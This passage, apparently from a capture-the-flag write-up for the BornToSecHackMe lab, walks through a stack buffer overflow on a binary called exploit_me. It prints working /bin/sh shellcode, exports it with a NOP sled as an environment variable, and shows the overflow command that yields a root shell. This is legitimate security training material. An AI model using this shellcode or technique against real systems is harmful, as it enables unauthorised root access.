Starting at the final step, there's another way to exploit our file:
# shellcode

Another option we can use in case of buffer overflows is a shellcode attack. The piece of hexadecimal code that we use as a payload for execution has already been pre-made for us in [shellcode injection](https://0xrick.github.io/binary-exploitation/bof5/):
``` shell
\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```
To export this as an environmental variable, we include <code>NOP</code> (<code>\x90</code>) within the shellcode. These instructions act as padding, ensuring that the shellcode is properly aligned within the buffer or memory space it occupies. Additionally, they make the shellcode easier to locate in environments where memory layout may shift.
``` shell
zaz@BornToSecHackMe:~$ export SCODE=`python -c 'print("\x90" * 150 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")'`
zaz@BornToSecHackMe:~$ cc addr.c -o addr
zaz@BornToSecHackMe:~$ ./addr
SCODE set at 0xbffff87f
```

# exploit
The exploit is constructed using the shellcode address and offset values to cause an overflow.
``` shell
zaz@BornToSecHackMe:~$ ./exploit_me $(python -c 'print "F"*140 + "\xbf\xff\xf8\x7f"[::-1]')
FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF���
$ whoami
root
```